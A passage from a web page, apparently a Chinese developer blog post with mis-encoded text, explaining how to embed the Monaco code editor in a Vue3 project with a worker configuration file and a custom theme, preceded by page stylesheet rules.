brwvHomY8jOtZ4fXWLnefdHVXv9044+8ZklCx75DXwcV1Sb27y+vInUQEuVYSaMgRJYfAwtoj0raFxIUW1A8nz35f02qLc9Lc9lG7CBkwtUR7bf+A+5uL6ehnH9Lat+5sIEfj3Cbj3NKRvP7Rjlo7FSmqavKvpSP8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAdCAYAAABcz8ldAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAhgSURBVGhD7Zp7bBTHHcdn33t7vvOdzy+ITVKDU0xIKG2ABCPTRCCaUiEVKWoqRJuASAhCitRCVKSoalFUKZBiSmmFRRJKRUnUtIpo+aNqGgwoOCmuFUIRzxjwE4zte+97drYzztji8HPvtkit/PnH+n1397Tz+83vN/PbMZhmmmmm+d+BoX8n5diihcGqgFQf5vk6BMAskWUlw3GyFnIvtqWSf91w7mKC3npfOLX7wYeiIa6BBWCOLLFRF2NB0JvIOP/80YG+k2ev6S699b/OzOfKBW5l5KsgyC4DCFQDnpEAdE1goc/dlNPc/Up7P711UiYNSMuyxeUzZPnHgGHWh5XADEkSAcdiN+AnEXIBhBComgFU0/xQR+jnj51sOUMf9Z0NKyL8S9+JPBEN8zuCMrsqGOA5QWAAyzLAxe53HBeYFgJp1c5Cx33nyIfpV3e+22/Sx32nev/sMCgVnmM4bjOniAtZWQAsz315EfsGQQc4hgWcjHkCmOj1rheuNn95cXwmDMiVp5etC/D8m5FwUWVQUYYGPh6mZYFUOgsGVa1pXvOZzVT2jRuH54RM230jEuI3RcIiL4l4UkxAJmuD/riVsqD7ct2m9nep7BtVTbVfZ0uE/UIk+CQflAHDjf8+Lg6MldYATGpH3c/Ul7p3dWXppVGM6eElJSHmnQWPbSlRlN1lJcUBjqNRnwJZVQO3B5P/uq5rK1d90pakckFcaKp5UJHY92JR8YlwkUDVySEZfGfQdO7E7Z8s2HL9TSoXTPXRud9nA8IBqSwcZgWeqpPj6BYw7yTbXBN9q2v9lQEq5zBmWA8vWLCptCi4tzwW8RQMQlFQATPLSh6vCSh/plJBkMyQBHZfWYnkKRgEktEVpTJXERN2Xzo4ex2VC6K6qXYpF5b3ypVRT8EgcAERSJXRbwCBOTFzXblM5RxGBaRt+ZPYA+LO0mgxz5K1Ig+UgAzKIuGnz39z6S+olDeaibaXRsU1RUFvgx+GwTWgPCaDgMw2XXpr9gwq50XV0bkxJiYeEiNF5cwE5XsiOEkAUkXkUW51SSOVchjl8WKef604XFSRbzCGCYeCoESStv/p8QU1VPIM3knNDynctnBRfsEYhgSlNCIGgQv2UCkvGIHZgteMh1nBW9W4F16RAM6yDVV7amZTaYQcr59cuuhhWRTWBvAMLxQGeyFSHOLnh0MvUskz5RF+fbRYDEy0mZgqQYUHOLhr//b6rGoqeaLqQG0pw3PrBbyA+4EQUkRmhvgqNUfICUipKK4OKUqIJVPKB0jpEhjmWWp64jdbKmVZZNYogcJm493gsifOqhDyeh9GYR/FM7sW+DA5CKR0MSK3tvKZkpwB5gRE4tjFEr7RL0iWBGV51vHFCyupNGWWPqLgnoer9mtyEGSJAzwLllDTGzyznDjRN/CwOFkoFb4bm0eVIXICgpvdGoEvrF7fC89zfLkkeV5HbOhWiTwTpKYvCAJLGshRdXtKMKAWlyxq+MPQLk1h66g5RE5ABJYNFrqY3wvJklJRUKg5ZWLFXIA86yek2uDOPkBNb3CM5Pf7DL2QyIrUGiLH+xC5Bmmm/ARnHUhC6PnzxWDK0RH5HuIjZGy27erU9AZ0dTIWXyG+NpBBrSFySxZw220IqeUPFoS6jVAPNadM7yDsgNB1qOkLuAziMYIb1PQGA75wIaKGPyAb+9oF16g5RE5ALIQ+tSyLWoWDEAK6aXW3JlK9VJoyx1oyvVkNdvo5KXXDAVkdnaKmNwx0xjH98w3JNmTCm+Bc9hKVhsgJSI9pvp9Vdd++jmq6AXB2/HHrhcs5aTkVDv0DFzoHvKdq/mQsKX/4t7KJLDpOJW+IbAvMGoMkxfwAWZB8DT7W1diTE+WcgKz6pK1bs6z3daPwmJDsSKt6ZsCyjlLJMz0DsDGZ8SdlDROBjOb8YeWOjptU8kTXusuaazu7oJrfEnQvdkpVcUn6PTVHyAkIIW7br/Unklni0EJIZ1WgGsauZR+fvUglz6zY0dGfVp09ybRNlfwgi3k8YSbvJJ29VMoLt9v6rZVQL7hOYUubndHJGclBtzn1byqNMCogi09/2nFb01/oj+f/5TyjauBOKtPcZ1r7qZQ3f2lRfxZPWi2anp8TSDAGExZMa2jr8u03L1M5L7q3Xc+iAeuHRl/ScvPcjSLDBnZS/cjtNHd2v3171Ewbs9N5q7Pn4otVMx3btBsCsoRbk1FxG5dMVgMDqfTpXl1/tuFMa5zKefPROdX59qLQBwLnNog8Wy1OcjB1N+QEsW/QsFNZuO35Xb1v98QLX4/Sx+O3wqujrQ6013ABUWI8+AaqBjAH01+ghL22+5X2PirnMG7r+esbnae/V1neauvGSoHjigTcVU7UGFm2DeK4ttxKpQ+mLPvl+o/PjnkAkw9HTqSMmVHhyAMx9iFcSh/BHTfLceO/C8mKjApBf9zszGhoY92m9sN+BGOY9AeD7eGniv8OTaOB4dgyTsQd9wS+IQu4lciYdkI7CLrNH3Rvbb9FL41i0tbzVP2iWJkobpN5fmM4IJfJskTP1Bk8A9HQmbpmGDBrWqdVCN/Yd7PjxKGOXn+bmbto3feVVcVB9qehIL8EJy8nChwgr0O2xxBnhGU5eP2CfYbl/m4gBRsbtneMORP9oGpjpcCsiKzHHfdOPiQ/wMniyFEu2dbiTQCAeN/vavC466BGYLttXc9fmXBXMGlAhiHHur+sq6uPiUI9z7CVHMPwBnLSuuN8FuC48/Oaz1ylt94XfrW5ouyprwWfYRkwNyCyYYjwkBHows1fa+tV/fzGxlv39b9gqvfPmQ+i/HK8KlcBjhHwfl8HEHyOd1JnuzZd66S3TTPNNNP8/wDAfwDG7G0m9LKBpwAAAABJRU5ErkJggg==) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ç›¸ä¿¡å¤§å®¶åœ¨åšä¸€äº›ä½ä»£ç å¹³å°çš„é¡¹ç›®æ—¶ï¼Œéƒ½ä¼šæ¶‰åŠåˆ°ä¸€äº›åœ¨çº¿IDEä»£ç ç¼–è¾‘çš„åŠŸèƒ½å§ï¼Œæ¯”å¦‚é€šè¿‡åœ¨çº¿ä»£ç ç¼–è¾‘åå®ç°åœ¨çº¿è¿è¡Œä»£ç æ•ˆæœ.</p>
<p>æœ¬ç¯‡ç»™å¤§å®¶åˆ†äº«ä¸€ä¸‹ä½œè€…ä¸ªäººåœ¨å¼€å‘ä½ä»£ç å¹³å°æ—¶å¦‚ä½•å®ç°å¦‚ä¸‹å›¾æ‰€ç¤ºçš„vscodeåœ¨çº¿ä»£ç IDEç¼–è¾‘åŠŸèƒ½çš„å§</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd1a33b433dc4dc09851cea5eb648216~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg562U5qGIYW5zd2Vy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766111544&amp;x-signature=2nMWABf4CSsRFsT%2FcVp3ySTHKBY%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">ä¸€ã€å®‰è£…ç›¸å…³æ’ä»¶</h3>
<pre><code class="hljs language-js" lang="js">pnpm add monaco-editor 
pnpm add monaco-editor-vue3
</code></pre>
<p>å› ä¸ºæ˜¯åœ¨Vue3é¡¹ç›®ä¸­æ‰€ä»¥è¿™é‡Œç›´æ¥ä½¿ç”¨ <em>monaco-editor-vue3</em> è¿™ä¸ªæ’ä»¶ä¼šæ›´åŠ ä¾¿æ·</p>
<h3 data-id="heading-2">äºŒã€æ–°å¢ä¸€ä¸ªmonaco.ts é…ç½®æ–‡ä»¶ï¼ˆè¿™ä¸ªå¾ˆé‡è¦ï¼‰</h3>
<p>åœ¨å®‰è£…å®Œæ’ä»¶åå…¶å®æˆ‘ä»¬è¿™æ ·ç›´æ¥åœ¨é¡µé¢ä¸­å¼•å…¥å°±å¯ä»¥ä½¿ç”¨äº†ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™é¡µé¢å…¶å®ä¼šæœ‰æŠ¥é”™çš„ï¼Œå¤§æ¦‚å°±æ˜¯æç¤ºä½ <em>monaco-editor</em> ç›¸å…³é…ç½®æ²¡æœ‰å¤„ç†</p>
<pre><code class="hljs language-js" lang="js">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"height: 400px; width: 800px"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">CodeEditor</span>
      <span class="hljs-attr">v-model:value</span>=<span class="hljs-string">"code"</span>
      <span class="hljs-attr">language</span>=<span class="hljs-string">"javascript"</span>
      <span class="hljs-attr">theme</span>=<span class="hljs-string">"vs-dark"</span>
      <span class="hljs-attr">:height</span>=<span class="hljs-string">"600"</span>
      <span class="hljs-attr">:options</span>=<span class="hljs-string">"editorOptions"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">CodeEditor</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor-vue3'</span>;

<span class="hljs-keyword">const</span> code = <span class="hljs-title function_">ref</span>(<span class="hljs-string">`function hello() {
console.log('Hello, Monaco Editor!');
}`</span>);

<span class="hljs-keyword">const</span> editorOptions = {
  <span class="hljs-attr">fontSize</span>: <span class="hljs-number">14</span>,
  <span class="hljs-attr">minimap</span>: { <span class="hljs-attr">enabled</span>: <span class="hljs-literal">false</span> },
  <span class="hljs-attr">automaticLayout</span>: <span class="hljs-literal">true</span>,
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª <em>monaco.ts</em> æ–‡ä»¶å¹¶æ·»åŠ ä»¥ä¸‹é…ç½®å†…å®¹</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> editorWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/editor/editor.worker?worker'</span>;
<span class="hljs-keyword">import</span> htmlWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/language/html/html.worker?worker'</span>;
<span class="hljs-keyword">import</span> cssWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/language/css/css.worker?worker'</span>;
<span class="hljs-keyword">import</span> jsonWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/language/json/json.worker?worker'</span>;
<span class="hljs-keyword">import</span> tsWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/language/typescript/ts.worker?worker'</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> monaco <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor'</span>;

declare <span class="hljs-variable language_">global</span> {
  interface <span class="hljs-title class_">Window</span> {
    <span class="hljs-title class_">MonacoEnvironment</span>?: {
      <span class="hljs-attr">getWorker</span>: <span class="hljs-function">(<span class="hljs-params">moduleId: string, label: string</span>) =&gt;</span> <span class="hljs-title class_">Worker</span>;
    };
  }
}

(self <span class="hljs-keyword">as</span> <span class="hljs-title class_">Window</span>).<span class="hljs-property">MonacoEnvironment</span> = {
  <span class="hljs-title function_">getWorker</span>(<span class="hljs-params">_: string, label: string</span>) {
    <span class="hljs-keyword">if</span> (label === <span class="hljs-string">'json'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">jsonWorker</span>();
    }
    <span class="hljs-keyword">if</span> (label === <span class="hljs-string">'css'</span> || label === <span class="hljs-string">'scss'</span> || label === <span class="hljs-string">'less'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">cssWorker</span>();
    }
    <span class="hljs-keyword">if</span> (label === <span class="hljs-string">'html'</span> || label === <span class="hljs-string">'handlebars'</span> || label === <span class="hljs-string">'razor'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">htmlWorker</span>();
    }
    <span class="hljs-keyword">if</span> (label === <span class="hljs-string">'typescript'</span> || label === <span class="hljs-string">'javascript'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">tsWorker</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">editorWorker</span>();
  },
};
 
</code></pre>
<p>åŒæ—¶åœ¨ <em>main.ts</em>  ä¸­å¼•å…¥  <em>monaco.ts</em></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'@/utils/monaco'</span>

type <span class="hljs-title class_">AppInstance</span> = <span class="hljs-title class_">AppType</span>&lt;<span class="hljs-title class_">Element</span>&gt;;

<span class="hljs-keyword">const</span> <span class="hljs-attr">app</span>: <span class="hljs-title class_">AppInstance</span> = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
</code></pre>
<p>ç•Œé¢ï¼šoké…ç½®æˆåŠŸåç•Œé¢å†…å®¹å¤§æ¦‚å°±æ˜¯è¿™æ ·</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca6a6d3278ad465195cb5c176f033b4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg562U5qGIYW5zd2Vy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766111544&amp;x-signature=MqsHAui5Fod3SKdF7lviFooP70A%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">è‡ªå®šä¹‰ä¸»é¢˜</h3>
<p>å¦‚æœä½ è§‰å¾—ç¼–è¾‘å™¨é»˜è®¤çš„ä¸»é¢˜æ ·å¼ä¸å¤ªå¥½çœ‹ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ä¸»é¢˜æ ·å¼ï¼Œè¿™é‡Œç®€å•çš„é…ç½®ä¸€ä¸‹</p>
<p>ä¾æ—§åœ¨<em>monaco.ts</em>ä¸­æ·»åŠ ä»£ç </p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å®šä¹‰ç¬¦åˆé¡¹ç›®ç³»ç»Ÿçš„è‡ªå®šä¹‰ä¸»é¢˜</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">customTheme</span>: monaco.<span class="hljs-property">editor</span>.<span class="hljs-property">IStandaloneThemeData</span> = {
  <span class="hljs-attr">base</span>: <span class="hljs-string">'vs-dark'</span>, <span class="hljs-comment">// åŸºäºå®˜æ–¹æš—è‰²ä¸»é¢˜</span>
  <span class="hljs-attr">inherit</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// ç»§æ‰¿é»˜è®¤è¯­æ³•é«˜äº®è§„åˆ™</span>
  <span class="hljs-attr">rules</span>: [
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'comment'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'617b91'</span>, <span class="hljs-attr">fontStyle</span>: <span class="hljs-string">'italic'</span> }, <span class="hljs-comment">// æ³¨é‡Šå‘ˆç°æ–œä½“ç°è“</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span>, <span class="hljs-attr">fontStyle</span>: <span class="hljs-string">'bold'</span> }, <span class="hljs-comment">// å…³é”®å­—åŠ ç²—æ·¡ç´«</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'string'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'a9b1d6'</span> }, <span class="hljs-comment">// å­—ç¬¦ä¸²æ·¡è“</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'number'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span> }, <span class="hljs-comment">// æ•°å­—æ·¡ç´«</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'operator'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c7cacf'</span> }, <span class="hljs-comment">// è¿ç®—ç¬¦æµ…ç°</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'delimiter'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c7cacf'</span> }, <span class="hljs-comment">// åˆ†éš”ç¬¦æµ…ç°</span>
